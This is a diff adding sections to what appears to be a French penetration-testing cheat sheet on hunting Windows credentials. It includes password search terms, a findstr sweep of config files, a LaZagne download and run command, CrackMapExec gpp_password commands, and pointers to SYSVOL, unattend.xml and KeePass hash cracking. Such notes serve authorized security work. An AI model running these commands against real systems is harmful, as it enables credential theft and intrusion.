@@ -1,6 +1,40 @@
 ---
 public: true
 ---
+## Dossiers intéressants
+- `c:\`
+- `%USERPROFILE%\`
+- `%USERPROFILE%\Documents`
+- `%USERPROFILE%\Desktop`
+
+## Barre de recherche Windows
+
+Mots à tenter dans la barre de recherche du menu Démarrer
+
+```
+Passwords
+Passphrases
+Keys
+Username
+User account
+Creds
+Users
+Passkeys
+Passphrases
+configuration
+dbcredential
+dbpassword
+pwd
+Login
+Credentials
+```
+
+## Findstr
+
+```
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
 ## Noms de fichiers intéressants
 
 ```batch
@@ -58,3 +92,43 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ## Snaffler
 
 <https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe>
+
+## Lazagne
+
+<https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>
+
+```
+C:\Users\bob\Desktop> start lazagne.exe all
+```
+
+## Mots de passe dans les stratégies de groupe
+
+```
+# cme smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
+
+Local admin:
+# cme smb 10.0.5.1 -u Administrator -p P@ss123 -d . -M gpp_password
+# cme smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M gpp_password
+
+Domain user:
+# cme smb 10.0.5.1 -u bkpadmin -p P@ss123 -d target.corp -M gpp_password
+```
+
+## Autre
+
+Passwords in scripts in different shares :
+
+- SYSVOL
+- IT shares
+
+Passwords in web.config files on dev machines and IT shares
+
+unattend.xml
+
+Passwords in the AD user or computer description fields
+
+KeePass databases --> pull hash, crack and get loads of access.
+
+Found on user systems and shares
+
+Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
